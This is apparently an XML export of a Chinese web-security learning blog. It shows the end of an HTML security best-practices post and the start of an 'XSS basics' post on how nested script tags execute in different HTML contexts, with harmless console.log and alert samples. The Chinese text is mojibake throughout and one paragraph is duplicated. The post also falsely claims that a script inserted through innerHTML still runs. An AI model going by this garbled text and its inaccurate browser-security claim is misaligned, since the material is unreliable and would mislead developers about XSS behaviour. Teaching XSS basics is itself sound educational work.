class="string">&quot;æäº¤åé¦ˆ&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">footer</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="symbol">&amp;copy;</span> 2025 WEBå®‰å…¨å­¦ä¹ å¹³å° | æœ¬é¡µé¢ä½¿ç”¨HTML5æ ‡å‡†æ„å»º<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#introduction&quot;</span>&gt;</span>è¿”å›é¡¶éƒ¨<span class="tag">&lt;/<span class="name">a</span>&gt;</span> | <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#form-example&quot;</span>&gt;</span>è¡¨å•ç¤ºä¾‹<span class="tag">&lt;/<span class="name">a</span>&gt;</span> | <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#table-example&quot;</span>&gt;</span>è¡¨æ ¼ç¤ºä¾‹<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">footer</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="å®‰å…¨æœ€ä½³å®è·µæ€»ç»“"><a href="#å®‰å…¨æœ€ä½³å®è·µæ€»ç»“" class="headerlink" title="å®‰å…¨æœ€ä½³å®è·µæ€»ç»“"></a>å®‰å…¨æœ€ä½³å®è·µæ€»ç»“</h2><ol>
<li><strong>å­—ç¬¦ç¼–ç </strong>ï¼šå§‹ç»ˆä½¿ç”¨UTF-8ç¼–ç ï¼Œé¿å…ç¼–ç è½¬æ¢æ¼æ´</li>
<li><strong>è¡¨å•å®‰å…¨</strong>ï¼š<ul>
<li>ä½¿ç”¨POSTæ–¹æ³•æäº¤æ•æ„Ÿæ•°æ®</li>
<li>å¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œä¸¥æ ¼éªŒè¯å’Œè¿‡æ»¤</li>
<li>ä½¿ç”¨CSRFä»¤ç‰Œé˜²æ­¢è·¨ç«™è¯·æ±‚ä¼ªé€ </li>
<li>é™åˆ¶æ–‡ä»¶ä¸Šä¼ ç±»å‹å’Œå¤§å°</li>
</ul>
</li>
<li><strong>å†…å®¹å®‰å…¨ç­–ç•¥ï¼ˆCSPï¼‰</strong>ï¼š<ul>
<li>é€šè¿‡<code>Content-Security-Policy</code>å¤´é™åˆ¶å¯æ‰§è¡Œçš„è„šæœ¬æ¥æº</li>
<li>é˜²æ­¢XSSæ”»å‡»</li>
</ul>
</li>
<li><strong>X-Frame-Options</strong>ï¼š<ul>
<li>è®¾ç½®ä¸º<code>DENY</code>æˆ–<code>SAMEORIGIN</code>é˜²æ­¢ç‚¹å‡»åŠ«æŒ</li>
</ul>
</li>
<li><strong>iframeå®‰å…¨</strong>ï¼š<ul>
<li>ä½¿ç”¨<code>sandbox</code>å±æ€§é™åˆ¶iframeåŠŸèƒ½</li>
<li>é¿å…åµŒå…¥ä¸å¯ä¿¡çš„ç¬¬ä¸‰æ–¹å†…å®¹</li>
</ul>
</li>
<li><strong>é“¾æ¥å®‰å…¨</strong>ï¼š<ul>
<li>å¤–éƒ¨é“¾æ¥ä½¿ç”¨<code>target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot;</code></li>
<li>é˜²æ­¢é€šè¿‡<code>window.opener</code>è®¿é—®åŸé¡µé¢</li>
</ul>
</li>
<li><strong>è¡¨æ ¼ä½¿ç”¨</strong>ï¼š<ul>
<li>ä»…ç”¨äºå±•ç¤ºç»“æ„åŒ–æ•°æ®ï¼Œä¸ç”¨äºé¡µé¢å¸ƒå±€</li>
<li>ä¸ºè¡¨æ ¼æ·»åŠ é€‚å½“çš„æ ‡é¢˜å’Œæè¿°</li>
<li>ä½¿ç”¨CSSæ§åˆ¶æ ·å¼ï¼Œè€ŒéHTMLå±æ€§</li>
</ul>
</li>
</ol>
<blockquote>
<p><strong>é‡è¦æé†’</strong>ï¼šHTMLæ˜¯Webå®‰å…¨çš„åŸºç¡€ï¼ŒæŒæ¡HTMLæ ‡ç­¾çš„æ­£ç¡®ä½¿ç”¨å’Œå®‰å…¨é…ç½®æ˜¯è¯†åˆ«å’Œé˜²å¾¡å„ç±»Webå®‰å…¨æ¼æ´çš„å‰æã€‚åœ¨å®é™…åº”ç”¨ä¸­ï¼Œåº”ç»“åˆåç«¯å®‰å…¨æªæ–½ï¼Œå…±åŒæ„å»ºå®‰å…¨çš„Webåº”ç”¨ã€‚</p>
</blockquote>
]]></content>
      <categories>
        <category>ç½‘ç»œå®‰å…¨</category>
        <category>Web</category>
        <category>HTMLåŸºç¡€</category>
      </categories>
      <tags>
        <tag>HTML</tag>
      </tags>
  </entry>
  <entry>
    <title>XSSæ¼æ´åŸºç¡€</title>
    <url>/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>æœ¬äººæ˜¯ä¸ªç½‘å®‰èœé¸¡ï¼Œè¿™æ˜¯å†™çš„ç¬¬ä¸€ç¯‡æœ‰å…³XSSæ¼æ´å­¦ä¹ çš„åšå®¢ï¼Œè¯·å¤šå¤šæŒ‡æ•™ã€‚</p>
<p>1.ç”±äºä¸å¯ä»¥åœ¨éä»£ç åŒºä¹¦å†™å®Œæ•´çš„htmlæ ‡ç­¾ ç”¨   [ ]  ä»£æ›¿ &lt;  &gt;</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">sript</span>&gt;</span>   --&gt;   [script]  </span><br></pre></td></tr></table></figure>
<p>2.ä½œè€…ç”¨çš„æ˜¯chromeæµè§ˆå™¨ï¼Œä¸åŒçš„æµè§ˆå™¨å›æ˜¾çš„ç½‘é¡µä»£ç é¢œè‰²æˆ–æ˜¯å®¹é”™è§„åˆ™æ–¹é¢æœ‰å·®å¼‚</p>
<hr>
<h1 id="ä¸€ã€xssæ¼æ´æ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#ä¸€ã€xssæ¼æ´æ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="ä¸€ã€xssæ¼æ´æ˜¯ä»€ä¹ˆï¼Ÿ"></a>ä¸€ã€xssæ¼æ´æ˜¯ä»€ä¹ˆï¼Ÿ</h1><p>XSSï¼ˆè·¨ç«™è„šæœ¬æ”»å‡»ï¼ŒCross-Site Scriptingï¼‰æ˜¯ä¸€ç§å¸¸è§çš„Webå®‰å…¨æ¼æ´ï¼Œæ”»å‡»è€…é€šè¿‡å‘ç½‘é¡µä¸­æ³¨å…¥æ¶æ„è„šæœ¬ä»£ç ï¼Œå½“å…¶ä»–ç”¨æˆ·è®¿é—®è¯¥é¡µé¢æ—¶ï¼Œè¿™äº›è„šæœ¬ä¼šåœ¨å…¶æµè§ˆå™¨ä¸­æ‰§è¡Œï¼Œä»è€Œå¯¼è‡´æ•°æ®æ³„éœ²ã€ä¼šè¯åŠ«æŒã€é’“é±¼æ”»å‡»ç­‰å®‰å…¨é—®é¢˜</p>
<hr>
<h1 id="äºŒã€xssæ¼æ´çš„åŸºæœ¬çŸ¥è¯†"><a href="#äºŒã€xssæ¼æ´çš„åŸºæœ¬çŸ¥è¯†" class="headerlink" title="äºŒã€xssæ¼æ´çš„åŸºæœ¬çŸ¥è¯†"></a>äºŒã€xssæ¼æ´çš„åŸºæœ¬çŸ¥è¯†</h1><h2 id="1-HTML-ä¸­çš„ã€Œæ–‡æœ¬æ ‡ç­¾ã€"><a href="#1-HTML-ä¸­çš„ã€Œæ–‡æœ¬æ ‡ç­¾ã€" class="headerlink" title="1.HTML ä¸­çš„ã€Œæ–‡æœ¬æ ‡ç­¾ã€"></a>1.HTML ä¸­çš„ã€Œæ–‡æœ¬æ ‡ç­¾ã€</h2><blockquote>
<p>é€šå¸¸æŒ‡ç”¨äºåŒ…è£¹æ–‡æœ¬å†…å®¹çš„æ ‡ç­¾ï¼Œä¾‹å¦‚ï¼š<br>æ®µè½æ ‡ç­¾ï¼špã€h1-h6<br>è¡Œå†…å®¹å™¨ï¼šspanã€emã€strong<br>åˆ—è¡¨é¡¹ï¼šli<br>å…¶ä»–æ–‡æœ¬å®¹å™¨ï¼šdivã€sectionï¼ˆè™½ç„¶é€šç”¨ï¼Œä½†å¸¸ç”¨äºåŒ…è£¹æ–‡æœ¬å—ï¼‰</p>
</blockquote>
<hr>
<h2 id="2-script-åµŒå¥—åœ¨ä¸åŒæ ‡ç­¾ä¸‹çš„è„šæœ¬è¿è¡Œæƒ…å†µ"><a href="#2-script-åµŒå¥—åœ¨ä¸åŒæ ‡ç­¾ä¸‹çš„è„šæœ¬è¿è¡Œæƒ…å†µ" class="headerlink" title="2.script åµŒå¥—åœ¨ä¸åŒæ ‡ç­¾ä¸‹çš„è„šæœ¬è¿è¡Œæƒ…å†µ"></a>2.script åµŒå¥—åœ¨ä¸åŒæ ‡ç­¾ä¸‹çš„è„šæœ¬è¿è¡Œæƒ…å†µ</h2><h3 id="è„šæœ¬æ‰§è¡Œçš„æ ¸å¿ƒè§„åˆ™"><a href="#è„šæœ¬æ‰§è¡Œçš„æ ¸å¿ƒè§„åˆ™" class="headerlink" title="*è„šæœ¬æ‰§è¡Œçš„æ ¸å¿ƒè§„åˆ™"></a>*è„šæœ¬æ‰§è¡Œçš„æ ¸å¿ƒè§„åˆ™</h3><ul>
<li>æµè§ˆå™¨çº é”™æœºåˆ¶<br>HTML è§£æå™¨ä¼šå°è¯•ä¿®å¤éæ³•åµŒå¥—ï¼Œå°† script ç§»åˆ°å…è®¸çš„ä½ç½®ï¼ˆå¦‚çˆ¶å®¹å™¨å¤–éƒ¨ï¼‰ï¼Œç¡®ä¿è„šæœ¬æ‰§è¡Œã€‚</li>
<li>å†…å®¹æ¨¡å‹ï¼ˆContent Modelï¼‰é™åˆ¶<br>æ¯ä¸ª HTML æ ‡ç­¾æœ‰å…è®¸åµŒå¥—çš„å†…å®¹ç±»å‹ï¼ˆå¦‚æµå†…å®¹ã€çŸ­è¯­å†…å®¹ç­‰ï¼‰ï¼Œéæ³•åµŒå¥—å¯èƒ½å¯¼è‡´ DOM ç»“æ„å˜åŒ–ã€‚</li>
<li>å®‰å…¨ç­–ç•¥å½±å“<br>å¦‚ CSPï¼ˆå†…å®¹å®‰å…¨ç­–ç•¥ï¼‰ä¼šé˜»æ­¢æœªæˆæƒçš„å†…è”è„šæœ¬æˆ–å¤–éƒ¨èµ„æºã€‚</li>
</ul>
<h3 id="è¡¥å……çŸ¥è¯†"><a href="#è¡¥å……çŸ¥è¯†" class="headerlink" title="*è¡¥å……çŸ¥è¯†"></a>*è¡¥å……çŸ¥è¯†</h3><blockquote>
<p>1.æµè§ˆå™¨åœ¨è§£æjavascriptçš„å±æ€§å€¼æ—¶ï¼Œæ˜¯æ”¯æŒåè¿›åˆ¶æˆ–æ˜¯åå…­è¿›åˆ¶çš„unicodeç¼–ç <br>2.URLç¼–ç ï¼Œä¹Ÿå«ç™¾åˆ†å·ç¼–ç ï¼Œæ˜¯ç”¨æ¥å°†ç‰¹æ®Šå­—ç¬¦è½¬æ¢æˆå¯ä»¥åœ¨URLä¸­å®‰å…¨ä½¿ç”¨çš„æ ¼å¼ï¼Œé€šå¸¸ç”¨%åŠ ä¸Šä¸¤ä½çš„åå…­è¿›åˆ¶æ•°æ¥è¡¨ç¤º<br>3. alert(â€œ â€œ)  alert(â€˜ â€˜)   åŒå¼•å·ä¸å•å¼•å·å‡å¯ä»¥<br> 4. console.log(â€˜ â€˜)    &#x2F;(â€œ â€œ)    æ§åˆ¶å°è¾“å‡º<br>5.urlç¼–ç çš„å­—ç¬¦-&gt;æœç´¢<br>6.å¤šä¸ªé”®å€¼å¯¹çš„è¾“å…¥ç”¨&amp;åˆ†å‰²<br>7.alignï¼ˆå¯¹é½ï¼‰å±æ€§æˆ–ç›¸å…³æ ‡ç­¾ï¼ˆæ¯”å¦‚ [div align&#x3D;â€centerâ€]ï¼‰ï¼Œè¿™åœ¨æ—©æœŸçš„ HTML ä¸­ç”¨äºå¯¹é½å†…å®¹ï¼Œä½†ç°ä»£å¼€å‘ä¸­å·²ä¸æ¨èä½¿ç”¨ï¼Œå»ºè®®æ”¹ç”¨ CSS å®ç°å¯¹é½ã€‚<br>8.å‰åç¬¦å·æœ€å¥½éƒ½é—­åˆï¼Œé˜²æ­¢æµè§ˆå™¨éé¢„æœŸâ€˜å®¹é”™â€™ï¼Œä¹Ÿå¯ä»¥æ´»åŠ¨æ³¨é‡Šç¬¦å·<br>9.srcï¼Œhref<br>10.gfiæ–‡ä»¶æ ¼å¼</p>
</blockquote>
<p>åœ¨ XSS æ”»å‡»æˆ–å‰ç«¯å¼€å‘ä¸­ï¼Œ<code>&lt;script&gt;</code> æ ‡ç­¾çš„<strong>åµŒå¥—ä½ç½®</strong>å’Œ<strong>ä¸Šä¸‹æ–‡ç¯å¢ƒ</strong>ä¼šç›´æ¥å½±å“è„šæœ¬çš„æ‰§è¡Œè¡Œä¸ºã€‚ä»¥ä¸‹æ˜¯ä¸åŒåœºæ™¯ä¸‹çš„è¯¦ç»†åˆ†æï¼š</p>
<hr>
<p>åœ¨ XSS æ”»å‡»æˆ–å‰ç«¯å¼€å‘ä¸­ï¼Œ<code>&lt;script&gt;</code> æ ‡ç­¾çš„<strong>åµŒå¥—ä½ç½®</strong>å’Œ<strong>ä¸Šä¸‹æ–‡ç¯å¢ƒ</strong>ä¼šç›´æ¥å½±å“è„šæœ¬çš„æ‰§è¡Œè¡Œä¸ºã€‚ä»¥ä¸‹æ˜¯ä¸åŒåœºæ™¯ä¸‹çš„è¯¦ç»†åˆ†æï¼š</p>
<hr>
<h3 id="1-æ ‡ç­¾çš„æ ‡å‡†ä½ç½®"><a href="#1-æ ‡ç­¾çš„æ ‡å‡†ä½ç½®" class="headerlink" title="1. &lt;script&gt; æ ‡ç­¾çš„æ ‡å‡†ä½ç½®"></a>1. <code>&lt;script&gt;</code> æ ‡ç­¾çš„æ ‡å‡†ä½ç½®</h3><p>HTML è§„èŒƒå…è®¸ <code>&lt;script&gt;</code> æ ‡ç­¾å‡ºç°åœ¨ <strong><code>&lt;head&gt;</code></strong> æˆ– <strong><code>&lt;body&gt;</code></strong> ä¸­ï¼Œä½†è¡Œä¸ºç•¥æœ‰å·®å¼‚ï¼š</p>
<ul>
<li><strong>åœ¨ <code>&lt;head&gt;</code> ä¸­</strong>ï¼š<ul>
<li>è„šæœ¬é»˜è®¤<strong>åŒæ­¥åŠ è½½å’Œæ‰§è¡Œ</strong>ï¼Œä¼šé˜»å¡ HTML è§£æã€‚</li>
<li>é€‚åˆåˆå§‹åŒ–ä»£ç æˆ–ä¾èµ–åº“ï¼ˆå¦‚ jQueryï¼‰ã€‚</li>
</ul>
</li>
<li><strong>åœ¨ <code>&lt;body&gt;</code> æœ«å°¾</strong>ï¼š<ul>
<li>å»¶è¿ŸåŠ è½½ï¼Œé¿å…é˜»å¡é¡µé¢æ¸²æŸ“ã€‚</li>
<li>é€‚åˆæ“ä½œ DOM çš„ä»£ç ï¼ˆéœ€ç¡®ä¿ DOM å·²åŠ è½½ï¼‰ã€‚</li>
</ul>
</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Head ä¸­çš„è„šæœ¬&quot;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>å†…å®¹<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Body æœ«å°¾çš„è„šæœ¬&quot;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<hr>
<h3 id="2-åµŒå¥—åœ¨å…¶ä»–æ ‡ç­¾å†…"><a href="#2-åµŒå¥—åœ¨å…¶ä»–æ ‡ç­¾å†…" class="headerlink" title="2. &lt;script&gt; åµŒå¥—åœ¨å…¶ä»–æ ‡ç­¾å†…"></a>2. <code>&lt;script&gt;</code> åµŒå¥—åœ¨å…¶ä»–æ ‡ç­¾å†…</h3><h4 id="åœºæ™¯-1ï¼šæ™®é€šå®¹å™¨æ ‡ç­¾ï¼ˆå¦‚-ã€ï¼‰"><a href="#åœºæ™¯-1ï¼šæ™®é€šå®¹å™¨æ ‡ç­¾ï¼ˆå¦‚-ã€ï¼‰" class="headerlink" title="åœºæ™¯ 1ï¼šæ™®é€šå®¹å™¨æ ‡ç­¾ï¼ˆå¦‚ &lt;div&gt;ã€&lt;span&gt;ï¼‰"></a>åœºæ™¯ 1ï¼šæ™®é€šå®¹å™¨æ ‡ç­¾ï¼ˆå¦‚ <code>&lt;div&gt;</code>ã€<code>&lt;span&gt;</code>ï¼‰</h4><ul>
<li><strong>è„šæœ¬ä»ä¼šæ‰§è¡Œ</strong>ï¼Œä½†éœ€æ³¨æ„<strong>æ‰§è¡Œæ—¶æœº</strong>ï¼š<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;åµŒå¥—åœ¨ div ä¸­çš„è„šæœ¬&quot;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>å½“ HTML è§£æåˆ°æ­¤å¤„æ—¶ç«‹å³æ‰§è¡Œã€‚</li>
<li>å¦‚æœå®¹å™¨æ ‡ç­¾è¢«åŠ¨æ€æ’å…¥ï¼ˆå¦‚é€šè¿‡ JSï¼‰ï¼Œè„šæœ¬ä¼šåœ¨æ’å…¥æ—¶æ‰§è¡Œã€‚</li>
</ul>
</li>
</ul>
<h4 id="åœºæ™¯-2ï¼šè¡¨å•æ ‡ç­¾ï¼ˆå¦‚-ï¼‰"><a href="#åœºæ™¯-2ï¼šè¡¨å•æ ‡ç­¾ï¼ˆå¦‚-ï¼‰" class="headerlink" title="åœºæ™¯ 2ï¼šè¡¨å•æ ‡ç­¾ï¼ˆå¦‚ &lt;form&gt;ï¼‰"></a>åœºæ™¯ 2ï¼šè¡¨å•æ ‡ç­¾ï¼ˆå¦‚ <code>&lt;form&gt;</code>ï¼‰</h4><ul>
<li>è„šæœ¬æ­£å¸¸æ‰§è¡Œï¼Œä½†å¯èƒ½ç ´åè¡¨å•ç»“æ„ï¼š<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;è¡¨å•å†…çš„è„šæœ¬&quot;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="åœºæ™¯-3ï¼šè¡¨æ ¼æ ‡ç­¾ï¼ˆå¦‚-ã€ï¼‰"><a href="#åœºæ™¯-3ï¼šè¡¨æ ¼æ ‡ç­¾ï¼ˆå¦‚-ã€ï¼‰" class="headerlink" title="åœºæ™¯ 3ï¼šè¡¨æ ¼æ ‡ç­¾ï¼ˆå¦‚ &lt;table&gt;ã€&lt;tr&gt;ï¼‰"></a>åœºæ™¯ 3ï¼šè¡¨æ ¼æ ‡ç­¾ï¼ˆå¦‚ <code>&lt;table&gt;</code>ã€<code>&lt;tr&gt;</code>ï¼‰</h4><ul>
<li>éƒ¨åˆ†æµè§ˆå™¨å¯èƒ½å›  HTML è§£æè§„åˆ™æ‹’ç»æ‰§è¡Œï¼š<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">table</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;è¡¨æ ¼å†…çš„è„šæœ¬&quot;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> <span class="comment">&lt;!-- å¯èƒ½ä¸æ‰§è¡Œ --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span>&gt;</span>å•å…ƒæ ¼<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>åº”é¿å…å°† <code>&lt;script&gt;</code> ç›´æ¥æ”¾åœ¨ <code>&lt;table&gt;</code> æˆ– <code>&lt;tr&gt;</code> å†…ã€‚</li>
</ul>
</li>
</ul>
<hr>
<h3 id="3-åœ¨ç‰¹æ®Šæ ‡ç­¾ä¸­çš„è¡Œä¸º"><a href="#3-åœ¨ç‰¹æ®Šæ ‡ç­¾ä¸­çš„è¡Œä¸º" class="headerlink" title="3. &lt;script&gt; åœ¨ç‰¹æ®Šæ ‡ç­¾ä¸­çš„è¡Œä¸º"></a>3. <code>&lt;script&gt;</code> åœ¨ç‰¹æ®Šæ ‡ç­¾ä¸­çš„è¡Œä¸º</h3><h4 id="åœºæ™¯-1ï¼š-æ ‡ç­¾"><a href="#åœºæ™¯-1ï¼š-æ ‡ç­¾" class="headerlink" title="åœºæ™¯ 1ï¼š&lt;noscript&gt; æ ‡ç­¾"></a>åœºæ™¯ 1ï¼š<code>&lt;noscript&gt;</code> æ ‡ç­¾</h4><ul>
<li>ä»…å½“æµè§ˆå™¨<strong>ç¦ç”¨ JavaScript</strong> æ—¶ï¼Œ<code>&lt;noscript&gt;</code> å†…çš„å†…å®¹ä¼šæ˜¾ç¤ºï¼š<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">noscript</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;ä¸ä¼šæ‰§è¡Œ&#x27;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>è¯·å¯ç”¨ JavaScript<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">noscript</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>å†…éƒ¨çš„ <code>&lt;script&gt;</code> <strong>æ°¸è¿œä¸ä¼šæ‰§è¡Œ</strong>ã€‚</li>
</ul>
</li>
</ul>
<h4 id="åœºæ™¯-2ï¼š-æ ‡ç­¾"><a href="#åœºæ™¯-2ï¼š-æ ‡ç­¾" class="headerlink" title="åœºæ™¯ 2ï¼š&lt;template&gt; æ ‡ç­¾"></a>åœºæ™¯ 2ï¼š<code>&lt;template&gt;</code> æ ‡ç­¾</h4><ul>
<li><code>&lt;template&gt;</code> å†…çš„å†…å®¹è¢«è§†ä¸º<strong>æƒ°æ€§æ–‡æ¡£ç‰‡æ®µ</strong>ï¼Œè„šæœ¬ä¸ä¼šæ‰§è¡Œï¼š<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;æ¨¡æ¿ä¸­çš„è„šæœ¬&quot;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>åªæœ‰å½“å†…å®¹è¢«å…‹éš†å¹¶æ’å…¥ DOM åï¼Œè„šæœ¬æ‰ä¼šæ‰§è¡Œã€‚</li>
</ul>
</li>
</ul>
<h4 id="åœºæ™¯-3ï¼šSVG-æˆ–-MathML-æ ‡ç­¾"><a href="#åœºæ™¯-3ï¼šSVG-æˆ–-MathML-æ ‡ç­¾" class="headerlink" title="åœºæ™¯ 3ï¼šSVG æˆ– MathML æ ‡ç­¾"></a>åœºæ™¯ 3ï¼šSVG æˆ– MathML æ ‡ç­¾</h4><ul>
<li>åœ¨ SVG&#x2F;MathML ä¸­åµŒå…¥ <code>&lt;script&gt;</code>ï¼Œè¡Œä¸ºä¸ HTML ä¸€è‡´ï¼š<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;SVG ä¸­çš„è„šæœ¬&quot;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h3 id="4-åŠ¨æ€æ’å…¥çš„"><a href="#4-åŠ¨æ€æ’å…¥çš„" class="headerlink" title="4. åŠ¨æ€æ’å…¥çš„ &lt;script&gt;"></a>4. åŠ¨æ€æ’å…¥çš„ <code>&lt;script&gt;</code></h3><p>é€šè¿‡ JavaScript åŠ¨æ€åˆ›å»ºçš„ <code>&lt;script&gt;</code> æ ‡ç­¾ï¼Œè¡Œä¸ºå—æ’å…¥ä½ç½®å½±å“ï¼š</p>
<h4 id="æ’å…¥åˆ°-æˆ–-ä¸­ï¼š"><a href="#æ’å…¥åˆ°-æˆ–-ä¸­ï¼š" class="headerlink" title="æ’å…¥åˆ° &lt;head&gt; æˆ– &lt;body&gt; ä¸­ï¼š"></a>æ’å…¥åˆ° <code>&lt;head&gt;</code> æˆ– <code>&lt;body&gt;</code> ä¸­ï¼š</h4><ul>
<li>è„šæœ¬å¼‚æ­¥åŠ è½½ï¼Œé»˜è®¤ä¸é˜»å¡é¡µé¢ï¼š<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> script = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;script&#x27;</span>);</span><br><span class="line">script.<span class="property">src</span> = <span class="string">&#x27;file.js&#x27;</span>;</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">head</span>.<span class="title function_">appendChild</span>(script); <span class="comment">// æˆ– document.body</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="æ’å…¥åˆ°å…¶ä»–å®¹å™¨ä¸­ï¼ˆå¦‚-ï¼‰ï¼š"><a href="#æ’å…¥åˆ°å…¶ä»–å®¹å™¨ä¸­ï¼ˆå¦‚-ï¼‰ï¼š" class="headerlink" title="æ’å…¥åˆ°å…¶ä»–å®¹å™¨ä¸­ï¼ˆå¦‚ &lt;div&gt;ï¼‰ï¼š"></a>æ’å…¥åˆ°å…¶ä»–å®¹å™¨ä¸­ï¼ˆå¦‚ <code>&lt;div&gt;</code>ï¼‰ï¼š</h4><ul>
<li>è„šæœ¬ä»ä¼šæ‰§è¡Œï¼Œä½†å¯èƒ½å› å®¹å™¨æœªæ¸²æŸ“è€Œæ— æ³•æ“ä½œå…¶å†…éƒ¨ DOMï¼š<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> div = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;div&#x27;</span>);</span><br><span class="line">div.<span class="property">innerHTML</span> = <span class="string">&#x27;&lt;script&gt;console.log(&quot;åŠ¨æ€è„šæœ¬&quot;);&lt;\/script&gt;&#x27;</span>;</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(div);</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
